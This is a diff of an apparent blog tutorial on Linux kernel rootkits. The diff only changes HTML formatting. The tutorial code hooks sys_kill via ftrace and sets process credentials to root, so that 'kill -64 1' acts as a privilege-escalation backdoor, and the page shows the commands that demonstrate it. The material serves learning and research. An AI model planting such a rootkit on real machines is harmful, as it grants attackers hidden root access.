@@ -184,7 +184,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <p>Assuming you&rsquo;ve read parts <a href="../linux_rootkits_01">1</a> and <a href="../linux_rootkits_02">2</a>, then you know all about how we&rsquo;re going to hook <code>sys_kill</code> using ftrace and that we&rsquo;ll have two copies of the hook for both the newer <code>pt_regs</code> convention as well as the pre-4.17.0 version. If that doesn&rsquo;t make sense to you, then you might want to revisit the earlier two posts.</p>
 </blockquote>
 <p>This is what our <code>hook_kill</code> function looks like. Note that for most of these posts, I&rsquo;m going to stick to the <code>pt_regs</code> convention (it&rsquo;s very to easy to re-write them for the old way). As always, the full working source is available at the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">repo</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
 {
     <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
 
@@ -205,7 +205,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <p>When attempting to implement some new functionality into the kernel, its always good to check the documentation to see if you can avoid a few headaches. In this case, we come out on top because there is <em>fantastic</em> documentation already prepared for us <a href="https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials">here</a>. As this document informs us, &ldquo;a task can only alter its own credentials, and may not alter those of another task&rdquo;.</p>
 <p>This means that we cannot give arbitrary processes root priveleges, but we <em>can</em> give ourselves root from within an already running process - for example, we should be able to run  <code>kill -64 1</code> (remember - the PID doesn&rsquo;t matter!) from bash, and automagically become root!</p>
 <p>The documentation then tells us that we need a <code>cred</code> struct, and that <code>prepare_creds()</code> will fill this struct with the process&rsquo;s current credentials. Then we can make any changes we want to this struct, before committing them back to the process with <code>commit_creds()</code>. Seems fairly straightforward, right? Roughly, our function will look like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
 {
     <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
     root <span style="color:#f92672">=</span> prepare_creds();
@@ -219,7 +219,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 }
 </code></pre></div><p>Now we have just have to fill in that middle bit! How do we go about finding the layout of the <code>cred</code> struct in the source? Although I always link to the kernel source on GitHub, the search in GitHub is awful. For this reason, it&rsquo;s best to keep a copy of the kernel source from <a href="https://github.com/torvalds/linux">torvalds</a> on your Vagrant machine - this way, you can just grep for what you&rsquo;re after. In this instance, <code>grep -ir struct\ cred\ {</code> only gives one result: <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h">include/linux/cred.h</a>.</p>
 <p>Down on <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/include/linux/cred.h#L111">line 111</a>, we see the following (shortened for clarity):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
     <span style="color:#75715e">/* redacted */</span>
 
     kuid_t      uid;    <span style="color:#75715e">/* real UID of the task */</span>
@@ -240,7 +240,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 </blockquote>
 <p>Seeing as these <code>val</code> fields are just <code>u16</code>s, we should just be able to set them all to <code>0</code> and, after committing them, we should be root!</p>
 <p>Our <code>set_root()</code> function now looks like:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
 {
     <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
     root <span style="color:#f92672">=</span> prepare_creds();
@@ -257,7 +257,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 }
 </code></pre></div><p>Okay, if you&rsquo;ve been following along, then finish up your hook and the rest of the ftrace business (see <a href="../linux_rootkits_02/">Part 2</a>) - otherwise you can download the completed rookit source <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">here</a>.</p>
 <p>Go ahead and <code>make</code> your kernel module and <code>insmod</code> it. Now simply send signal <code>64</code> to <em>any</em> process, say <code>kill -64 1</code>. Now check <code>id</code> and you&rsquo;ll be root!</p>
-<pre><code>$ sudo insmod rootkit.ko
+<pre tabindex="0"><code>$ sudo insmod rootkit.ko
 $ kill -64 1
 $ id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lxd),117(lpadmin),118(sambashare),1000(vagrant)
